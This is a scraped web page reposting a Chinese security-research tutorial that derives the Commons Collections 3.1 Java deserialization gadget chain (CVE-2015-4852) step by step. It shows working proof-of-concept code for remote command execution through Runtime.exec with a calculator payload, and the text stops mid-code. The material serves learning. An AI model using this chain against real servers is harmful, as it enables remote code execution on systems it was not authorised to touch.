<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>JAVA反序列化 - commons-collections - 1 | 极客快訊</title><meta property="og:title" content="JAVA反序列化 - commons-collections - 1 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p1.pstatp.com/large/pgc-image/ecc736cc16fc4ab584bae36f7724c7c8"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/a6b9d78d.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/a6b9d78d.html><meta property="article:published_time" content="2020-11-14T21:03:08+08:00"><meta property="article:modified_time" content="2020-11-14T21:03:08+08:00"><meta name=Keywords content><meta name=description content="JAVA反序列化 - commons-collections - 1"><meta name=author content="极客快訊"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/a6b9d78d.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快讯 Geek Bank</a></h1><p class=description>为你带来最全的科技知识 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>JAVA反序列化 - commons-collections - 1</h1></header><date class="post-meta meta-date">2020-11-14</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><p>以下文章来源于雷神众测 ，作者lala</p><p><strong>No.1声明</strong></p><p>由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测以及文章作者不为此承担任何责任。雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。</p><p><strong>No.2前言</strong></p><p>这是个人学习java反序列化的第一篇利用链的文章，就好像P牛说的不知道为什么网上讲到java反序列化学习，上来就是cc链，你知道这个链它有多复杂么.jpg。萌新也是理所当然的踩了这个坑，然后…..在一路质疑自己智商和"我不服"的情况下趟了过去。</p><p>路难行，难行，总归要走。</p><p>走来，回望去，呵，牛逼。</p><p>在此文中是以一个只了解java反射机制和反序列化利用点（readObject）的视角去一点点复现推导了commons-collections、jdk1.7的poc的构造。</p><p>同时记录下了一个个踩的坑，再爬出来，再跳进去，再爬出来的历程。</p><p>如果你具备了反射机制和反序列化基本原理的知识，同时想学习cc链的话，个人感觉是这篇文是再适合不过了。</p><p>那么开始。</p><p>了解反射机制的话，我们会发现若存在一个固有的反射机制时，输入可控，就可能形成任意函数调用的情况，具有极大的危害。但实际上真的有存在这种情况：这就是commons-collections-3.1 jar包，cve编号：cve-2015-4852</p><p>在开始之前我们需要理一下反序列化漏洞的攻击流程：</p><ol start=1><li>客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码）</li><li>exp发送到服务端，进入一个服务端自主复写（也可能是也有组件复写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层）</li><li>这个恶意数据exp_1在接下来的处理流程(可能是在自主复写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3……</li><li>最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。</li></ol><p>那么以上大概可以分成三个主要部分：</p><ol start=1><li>payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等；我把它称为：payload</li><li>反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(在此篇中就是commons-collections利用链)</li><li>readObject复写利用点：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数复写点；我把它称为readObject复写利用点（自创名称…）</li></ol><p><strong>No.3commons-collections-3.1</strong></p><p>首先来看看commons-collections项目吧官网第一段：</p><p>Java commons-collections是JDK 1.2中的一个主要新增部分。它添加了许多强大的数据结构，可以加速大多数重要Java应用程序的开发。从那时起，它已经成为Java中公认的集合处理标准。</p><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。它是一个基础数据结构包，同时封装了很多功能，其中我们需要关注一个功能：</p><ul><li>Transforming decorators that alter each object as it is added to the collection</li><li>转化装饰器：修改每一个添加到collection中的object</li></ul><p>Commons Collections实现了一个TransformedMap类，该类是对Java标准数据结构Map接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由Transformer类定义，Transformer在TransformedMap实例化时作为参数传入。org.apache.commons.collections.Transformer这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，我们的漏洞触发函数就是在于这个点。</p><p>漏洞复现需要下载3.1版本,进去寻觅一下源码和jar包都有。</p><p>由于没有找到漏洞版本3.1的api说明，我们可以参考3.2.2的api文档</p><p><strong>No.4POC->利用链</strong></p><p>我们将通过调试POC得到漏洞利用链的调用栈，顺便介绍一下各个类，再通过分析调用栈的函数，反推出POC来探究其中的利用原理。</p><p>我们先看一下网上的POC代码，如下：</p><p>import org.apache.commons.collections.*;import org.apache.commons.collections.functors.ChainedTransformer;import org.apache.commons.collections.functors.ConstantTransformer;import org.apache.commons.collections.functors.InvokerTransformer;import org.apache.commons.collections.map.TransformedMap;import java.util.HashMap;import java.util.Map;public class commons_collections_3_1 { public static void main(String args) throws Exception { //此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //将transformers数组存入ChaniedTransformer这个继承类Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //给予map数据转化链Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //触发漏洞Map.Entry onlyElement = (Map.Entry) outerMap.entrySet.iterator.next; //outerMap后一串东西，其实就是获取这个map的第一个键值对（value,value）；然后转化成Map.Entry形式，这是map的键值对数据格式onlyElement.setValue("foobar");}}</p><p>好好看代码的同学肯定会意识到，以上的poc其实只包括我总结三要素的payload和反序列化利用链两者。而关键的readObject复写利用点没有包含在内。事实确实如此。这个poc的复写利用点是sun.reflect.annotation.AnnotationInvocationHandler的readObject，但是我们先精简代码关注payload和利用链，最后再加上readObject复写点。</p><p>调试以上POC，得到两种调用栈：</p><p><strong>漏洞链</strong></p><p>Map.Entry其实就是键值对的数据格式，其setValue函数如下AbstracInputCheckedMapDecorator.class</p><p>public Object setValue(Object value) {value = this.parent.checkSetValue(value);//进入此处return super.entry.setValue(value);}</p><p>TransformedMap是一种重写map类型的set函数和Map.Entry类型的setValue函数去调用转换链的Map类型。TransformedMap.class</p><p>protected Object checkSetValue(Object value) { return this.valueTransformer.transform(value);//进入此处}</p><p>由于TransformedMap具有commons_collections的转变特性，当赋值一个键值对的时候会自动对输入值进行预设的Transformer的调用。</p><p>ChainedTransformer.class：这里有一个</p><p>public Object transform(Object object) { for(int i = 0; i &lt; this.iTransformers.length; ++i) { //循环进入此处，先进入1次ConstantTransformer.class，再3次InvokerTransformer.classobject = this.iTransformers[i].transform(object); //另外需要注意在数组的循环中，前一次transform函数的返回值，会作为下一次transform函数的object参数输入。} return object;}</p><p>transform函数是一个接口函数，在上面的循环中进入了不同的函数。先是1次ConstantTransformer.class</p><p>public Object transform(Object input) { return this.iConstant;}</p><p>再是进入了InvokerTransformer.class，看到这个就会发现有点东西了。</p><p>public Object transform(Object input) { if (input == null) { return null;} else { try { //获取input对象的classClass cls = input.getClass; //根据iMethodName、iParamTypes选择cls中的一个方法Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //根据iArgs参数调用这个方法return method.invoke(input, this.iArgs);} catch (NoSuchMethodException var5) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' does not exist");} catch (IllegalAccessException var6) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' cannot be accessed");} catch (InvocationTargetException var7) { throw new FunctorException("InvokerTransformer: The method '" + this.iMethodName + "' on '" + input.getClass + "' threw an exception", var7);}}}}</p><p>明显的反射机制，可见InvokerTransformer就是我们的触发任意代码执行处，我们看看源码中的文件描述：先看看我们需要关注的InvokerTransformer类的描述（在jar包中是找不到描述信息的，可以通过下载官方源码得到）：</p><p>/*** Transformer implementation that creates a new object instance by reflection.*通过反射机制创建一个新的对象实例的转换器实现</p><p>我们可以这里有经典的反射机制调用，在细节分析前我们先整理一下调用栈，但不需要很理解。</p><p>Map.Entry 类型setValue("foobar")=> AbstracInputCheckedMapDecorator.setValue=> TransformedMap.checkSetValue=> ChainedTransformer.transform(Object object)根据数组，先进入 => ConstantTransformer.transform(Object input)再进入 => InvokerTransformer.transform(Object input)</p><p><strong>No.5重构POC</strong></p><p>首先明确我们的最终目的是为了执行语句Runtime.getRuntime.exec("calc.exe");</p><ul><li>Runtime.getRuntime：获取一个Runtime的实例</li><li>exec：调用实例的exec函数</li></ul><p>因为漏洞函数最后是通过反射机制调用任意这个语句先转化成反射机制如下（后面需要用到）：</p><p>至于如何构造反射机制的语句，参考往期文章java反射机制</p><p>Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//此处在获取实例,"calc.exe")</p><p><strong>第一步 InvokerTransformer</strong></p><p>再回看反射机制触发函数InvokerTransformer类的transform(Object input)（做了简化处理，只留取重点部分）：</p><p>public Object transform(Object input) {Class cls = input.getClass;Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);</p><p>通过构造的反射机制以及以上代码进行填空，可以得出当变量等于以下值时，可形成命令执行：</p><p>Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));this.iMethodName="exec"this.iParamTypes=String.classthis.iArgs="calc.exe"</p><p>那么在InvokerTransformer类源码中我们可以找到赋值this.iMethodName,this.iParamTypes,this.iArgs的构造函数:</p><p>public InvokerTransformer(String methodName, Class paramTypes, Object args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args;}</p><p>我们就可以构建以下测试代码直接调用InvokerTransformer通过反射执行任意命令：下面开始试一下：</p><p>public static void main(String args) throws Exception { //通过构造函数，输入对应格式的参数，对iMethodName、iParamTypes、iArgs进行赋值InvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"}); //构造inputObject input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")); //执行a.transform(input);}</p><div class=pgc-img><img alt="JAVA反序列化 - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/ecc736cc16fc4ab584bae36f7724c7c8><p class=pgc-img-caption></p></div><p><strong>在第二步之前</strong></p><p>弹出了计算器！好像很厉害的样子！然后我们来模拟一下利用场景：</p><ul><li>为了方便，攻击者受害者写在同一函数中</li><li>使用文件写入，代替网络传输</li></ul><p>由于InvokerTransformer继承了Serializable类，是可以成功序列化的</p><p>public static void main(String args) throws Exception { //模拟攻击//1.客户端构造序列化payload，使用写入文件模拟发包攻击InvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"});FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(a); //2.服务端从文件中读取payload模拟接受包，然后触发漏洞//服务端反序列化payload读取FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //神奇第一处：服务端需要自主构造恶意inputObject input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")); //神奇第二处：服务端需要将客户端输入反序列化成InvokerTransformer格式，并在服务端自主传入恶意参数inputInvokerTransformer a_in = (InvokerTransformer) fin.readObject;a_in.transform(input);}</p><p>我们会发现如果我们要直接利用这个反射机制作为漏洞的话，需要服务端的开发人员：</p><ol start=1><li>帮我们写一个payload作为input；</li><li>接受客户端输入参数，反序列化成InvokerTransformer类</li><li>再刻意调用InvokerTransformer类的transform函数</li></ol><p>实际上…..只有开发人员是自己人的情况下才满足条件吧……所以我们面临一些问题：</p><ol start=1><li>payload肯定需要在客户端可以自定义构造，再传输进入服务端</li><li>服务端需要把我们的输入exp反序列化成一个在代码中可能使用到的类</li><li>并且在代码正常操作中会调用这个类中的一个可触发漏洞地函数（当然这个函数最后会进入我们InvokerTransformer类的transform函数，从而形成命令执行）</li><li>如果这个反序列化的类和这个类触发命令执行的方法可以在一个readObject复写函数中恰好触发，就对于服务端上下文语句没有要求了！</li></ol><p>这边假如像预期这样，是对服务端上下文没有要求，因为只要执行readObject就肯定会命令执行，不需要其他上下文条件。</p><p>但是对于服务端版本环境是有要求的，之后会说到</p><p>那么我们一个个来解决问题：首先使客户端自定义paylaod！</p><p><strong>第二步 ChainedTransformer</strong></p><p>下面我们需要关注ChainedTransformer这个类,首先看一下这个类的描述：</p><p>/*** Transformer implementation that chains the specified transformers together.* &lt;p>* The input object is passed to the first transformer. The transformed result* is passed to the second transformer and so on.*将指定的转换器连接在一起的转化器实现。输入的对象将被传递到第一个转化器，转换结果将会输入到第二个转化器，并以此类推</p><p>可以知道他会把我们的Transformer变成一个串，再逐一执行，其中这个操作对应的就是ChainedTransformer类的transform函数</p><p>/*** Transforms the input to result via each decorated transformer** @param object the input object passed to the first transformer* @return the transformed result*/public Object transform(Object object) { for (int i = 0; i &lt; iTransformers.length; i++) {object = iTransformers[i].transform(object);} return object;}</p><p>这里会遍历iTransformers数组，依次调用这个数组中每一个Transformer的transform，并串行传递执行结果。</p><p>首先确定iTransformers可控，iTransformers数组是通过ChainedTransformer类的构造函数赋值的：</p><p>/*** Constructor that performs no validation.* Use &lt;code>getInstance&lt;/code> if you want that.** @param transformers the transformers to chain, not copied, no nulls*/public ChainedTransformer(Transformer transformers) { super;//这个super不清楚做了啥，iTransformers = transformers;}</p><p>那么我们知道可以自定义iTransformers的内容，我们已有条件如下：</p><p>//最终执行目标Class.forName("java.lang.Runtime").getMethod("exec", String.class).invoke(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))//此处在获取实例, "calc.exe") //InvokeTransformer关键语句：public Object transform(Object input) {Class cls = input.getClass;Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);}</p><p>再看到InvokeTransformer代码我们需要引出一个注意点：</p><p>这里我们需要注意到input.getClass这个方法使用上的一些区别：</p><ul><li>当input是一个类的实例对象时，获取到的是这个类</li><li>当input是一个类时，获取到的是java.lang.Class</li></ul><p>可以使用如下代码验证，这里不再赘述</p><p>Object a = Runtime.getRuntime;Class b = Runtime.class;System.out.println(a.getClass);System.out.println(b.getClass); //结果//class java.lang.Runtime//class java.lang.Class</p><p>基于之前写的代码：</p><p>//只调用InvokeTransformer的情况如下：InvokerTransformer a = new InvokerTransformer( "exec", new Class{String.class}, new String{"calc.exe"});Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));</p><p>我们也可以知道input的为Runtime类的对象，所以cls就是Runtime类，所以cls.getMethod可以找到exec方法，直接进行调用。</p><p>先把a封装成ChainedTransformer格式，但是payload还是在外面</p><p>//客户端构造payloadTransformer transformers = new Transformer { new InvokerTransformer("exec",new Class{String.class},new String{"calc.exe"});}Transformer transformerChain = new ChainedTransformer(transformers); //服务端触发所需内容Object input=Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"));transformerChain.transform(input);//此处必须为input，作为第一个输入</p><p>把payload放入Transformer数组中，需要转化成特定的Transformer格式才行。</p><p><strong>第二点五步 ConstantTransformer -> Runtime实例序列化</strong></p><p>我们找到ConstantTransformer类跟InvokkerTransformer一样继承Transforme父类，可以进入数组顾名思义ConstantTransformer类其实就只会存放一个常量；它的构造函数会写入这个变量，他的transform函数会返回这个变量。把Runtime实例写入这个变量：</p><p>Transformer transformers = new Transformer { //以下两个语句等同,一个是通过反射机制得到，一个是直接调用得到Runtime实例// new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))),new ConstantTransformer(Runtime.getRuntime), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(null);//此处输入可以为任意值，因为不会被使用到，相当于初始第一个输入为我们设置的常量</p><p>以上代码可以成功弹框执行！那么我们模拟一下序列化与反序列化过程！</p><p>//客户端构造payloadTransformer transformers = new Transformer { new ConstantTransformer(Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime"))), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers); //payload序列化写入文件，模拟网络传输FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(transformerChain); //服务端反序列化payload读取FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //服务端反序列化成ChainedTransformer格式，并在服务端自主传入恶意参数inputTransformer transformerChain_now = (ChainedTransformer) fin.readObject;transformerChain_now.transform(null);</p><p>但是很遗憾的告诉以为快要成功的你，成功的本地测试加上序列化、反序列化过程之后就会失败。因为Runtime类的定义没有继承Serializable类，所以是不支持反序列化的。</p><div class=pgc-img><img alt="JAVA反序列化 - commons-collections - 1" onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/a692eb7772c1477f83a9626dd41407bf><p class=pgc-img-caption></p></div><p>那么我们在payload写入Runtime实例的计划就泡汤了。</p><p><strong>第二点八步 在服务端生成Runtime实例</strong></p><p>既然我们没法在客户端序列化写入Runtime的实例，那就让服务端执行我们的命令生成一个Runtime实例呗？我们知道Runtime的实例是通过Runtime.getRuntime来获取的，而InvokerTransformer里面的反射机制可以执行任意函数。同时，我们已经成功执行过Runtime类里面的exec函数。讲道理肯定是没问题的.</p><p>我们先看getRuntiime方法的参数</p><p>public static Runtime getRuntime { return currentRuntime;}</p><p>没有参数，那就非常简单了</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class),//得到Runtime class//由于InvokerTransformer的构造函数要求传入Class类型的参数类型，和Object类型的参数数值，所以封装一下，下面也一样//上面传入Runtime.class，调用Runtime class的getRuntime方法（由于是一个静态方法，invoke调用静态方法，传入类即可）new InvokerTransformer("getRuntime",new Class{},new Object{}), //上面Runtime.getRuntime得到了实例，作为这边的输入(invoke调用普通方法，需要传入类的实例)new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};Transformer transformerChain = new ChainedTransformer(transformers);transformerChain.transform(null);</p><p>在这里，之前自己陷入了一个很傻逼的问题，即：InvokerTransformer类transform方法中return method.invoke这个语句invoke调用到底return了啥?因为在这里形成了一个调用return的结果，再调用的链。为什么就可以上一个输出作为下一个输入时，可以成功调用了呢？一开始以为invoke会统一返回一个对象作为下一个输入什么的，并且在调试的时候每次invoke的结果都不一样，源码看的头晕。实际上是钻了死胡同：invoke的return是根据被调用的函数return啥，invoke就return啥。就好比我invoke一个我自定义的方法a，在a中，我return了字符串"1"。那么就是invoke的结果就是字符串"1"。看以上的过程就是第一次Runtime.getRuntime的结果输入了下一个InvokerTransformer</p><p>以上感觉是万事大吉了！但是实际上并不是…</p><p>回想之前对于InvokerTransformer中Class cls = input.getClass;的解释</p><ul><li>这里我们需要注意到input.getClass这个方法使用上的一些区别：</li><li>当input是一个类的实例对象时，获取到的是这个类</li></ul><p>当input是一个类时，获取到的是java.lang.Class</p><p>我们来推演第一次InvokerTransformer的反射调用，即得到Runtime类对象的getRuntime方法调用:</p><p>//InvokeTransformer关键语句：public Object transform(Object input) {//input为我们设置的常量Runtime.classClass cls = input.getClass;//！！！这里由于input是一个类，会得到java.lang.Class//在java.lang.Class类中去寻找getRuntime方法企图得到Runtime类对象，此处报错！！Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs);}</p><p>那么我们好像陷入了一个死胡同：得到Runtime类实例才能调用exec方法。而得到Runtime类实例作为input，才能得到Runtime class，才能找到getRuntime方法，得到Runtime类实例………</p><p>…………………非常的尴尬…………………..</p><p><strong>第二点九步 还是反射机制</strong></p><p>那么我们通过直接调用Runtime.getRuntime方法好像是行不通了,有没有其他方法呢？</p><p><strong>还是反射机制</strong></p><p>已知：</p><ol start=1><li>我们开头不能获得Class.forName("java.lang.Runtime")，只能得到Class.forName("java.lang.Class")</li><li>我们可以有任意的反射机制求：</li><li>我们要获取到Runtime.getRunime函数，并执行它。解：</li><li>通过反射机制获取反射机制中的getMethod类，由于getMethod类是存在Class类中，就符合开头Class类的限制</li><li>通过getMethod函数获取Runtime类中的getRuntime函数</li><li>在哪个类中调用getMethod去获取方法，实际上是由invoke函数里面的的第一个参数obj决定的</li><li>再通过反射机制获取反射机制中的invoke类，执行上面获取的getRuntime函数</li><li>invoke调用getRuntime函数，获取Runtime类的实例这里在使用反射机制调用getRuntime静态类时，invoke里面第一个参数obj其实可以任意改为null，或者其他类，而不一定要是Runtime类</li></ol><p>具体变化细节，我选择把它放在反射机制一文中说明，这边给出结果。</p><p>我们的最终目的是执行Class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(Class.forName("java.lang.Runtime")</p><p>先来获取getRuntime类</p><p>//目标语句Class.forName("java.lang.Runtime").getMethod("getRuntime")//使用java.lang.Class开头Class.forName("java.lang.Class").getMethod("getMethod", new Class {String.class, Class.class }).invoke(Class.forName("java.lang.Runtime"),"getRuntime",new Class[0]); //invoke函数的第一个参数是Runtime类，我们需要在Runtime类中去执行getMethod，获取getRuntime参数</p><p>对照着InvokerTransformer类转变为transformers格式</p><p>Class cls = input.getClass;//cls = java.lang.ClassMethod method = cls.getMethod(this.iMethodName, this.iParamTypes); //getMethod方法return method.invoke(input, this.iArgs); //在Runtime中找getRuntime方法，并返回这个方法</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), //还需要填充 调用getRuntime得到Runtime实例,new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};</p><p>还差执行获取到的getRuntime，下一个input是上一个执行接口，继续对照</p><p>//input=getRuntime这个方法Class cls = input.getClass;//cls = java.lang.Method（getRuntime方法是method类）Method method = cls.getMethod(this.iMethodName, this.iParamTypes); //在method类中找到invoke方法，method=invoke方法return method.invoke(input, this.iArgs); //调用invoke方法，input=getRuntime这个方法，传入自定义的参数</p><p>以上最后一步有点复杂，method就是invoke方法，相当于使用invoke调用了invoke函数。首先this.iMethodName, this.iParamTypes是根据invoke接口而定的：</p><p>public Object invoke(Object obj, Object... args)//this.iMethodName="invoke"//this.iParamTypes=new Class {Object.class, Object.class }//外面class、Object封装是InvokerTransformer类的构造函数要求</p><p>按照invoke中的input才是它要调用的环境的准则。invoke方法.invoke(input, this.iArgs)实际上等于input.invoke(this.iArgs)，而input=getRuntime方法，那么只要填入this.iArgs就好了</p><p>又由于getRuntime是个静态函数，不用太纠结输入obj，写作null。getRuntime方法不需要参数。this.iArgs=null,new Object[0]</p><p>那么整合就如下：</p><p>Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})};</p><p>以上代码其实就是等同于((Runtime)Runtime.class.getMethod("getMethod",null).invoke(null,null)).exec("calc.exe");我们笼统的来理解，实际就是如下（这里偷一张orleven的图）：</p><div class=pgc-img><img alt="JAVA反序列化 - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/399744f6d7d94c5bb840de05422a8d70><p class=pgc-img-caption></p></div><p>总体上来说：利用了反射机制调用反射机制的函数，绕过了开头cls只能为java.lang.Class的限制，根据具体环境input环环相扣，特么竟然恰好就通了….非常的微妙….</p><p><strong>第三步 TransformedMap</strong></p><p>那么我们在第二步通过ConstantTransformer、ChainedTransformer就完成了payload在客户端自定义这一目标，我们看一下目前的攻击流程</p><p>public class commons_collections_3_1 { public static void main(String args) throws Exception { //1.客户端构建攻击代码//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //将transformers数组存入ChaniedTransformer这个继承类Transformer transformerChain = new ChainedTransformer(transformers); //payload序列化写入文件，模拟网络传输FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(transformerChain); //2.服务端读取文件，反序列化，模拟网络传输FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); //服务端反序列化成ChainedTransformer格式，再调用transform函数Transformer transformerChain_now = (ChainedTransformer) fin.readObject;transformerChain_now.transform(null);}}</p><div class=pgc-img><img alt="JAVA反序列化 - commons-collections - 1" onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/24822ba4d14747858166a8c065c96838><p class=pgc-img-caption></p></div><p>完成命令执行服务端执行如下操作：</p><ol start=1><li>服务端反序列化我们的输入成ChainedTransformer类型</li><li>调用这个输入的transform函数</li></ol><p>转变的类型是一个数据转化链数据格式，很明显服务端不可能存在这种代码，利用价值不足，接下来我们需要继续延长这个漏洞链。</p><p><strong>封装成Map</strong></p><p>由于我们得到的是ChainedTransformer，一个转换链，TransformedMap类提供将map和转换链绑定的构造函数，只需要添加数据至map中就会自动调用这个转换链执行payload。</p><p>这样我们就可以把触发条件从显性的调用转换链的transform函数延伸到修改map的值。很明显后者是一个常规操作，极有可能被触发。</p><p>TransformedMap</p><p>public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer);}</p><p>try一下：</p><p>public static void main(String args) throws Exception { //1.客户端构建攻击代码//此处构建了一个transformers的数组，在其中构建了任意函数执行的核心代码Transformer transformers = new Transformer { new ConstantTransformer(Runtime.class), new InvokerTransformer("getMethod", new Class {String.class, Class.class }, new Object {"getRuntime", new Class[0] }), new InvokerTransformer("invoke", new Class {Object.class, Object.class }, new Object {null, new Object[0] }), new InvokerTransformer("exec", new Class {String.class }, new Object {"calc.exe"})}; //将transformers数组存入ChaniedTransformer这个继承类Transformer transformerChain = new ChainedTransformer(transformers); //创建Map并绑定transformerChinaMap innerMap = new HashMap;innerMap.put("value", "value"); //给予map数据转化链Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); //payload序列化写入文件，模拟网络传输FileOutputStream f = new FileOutputStream("payload.bin");ObjectOutputStream fout = new ObjectOutputStream(f);fout.writeObject(outerMap); //2.服务端接受反序列化，出发漏洞//读取文件，反序列化，模拟网络传输FileInputStream fi = new FileInputStream("payload.bin");ObjectInputStream fin = new ObjectInputStream(fi); 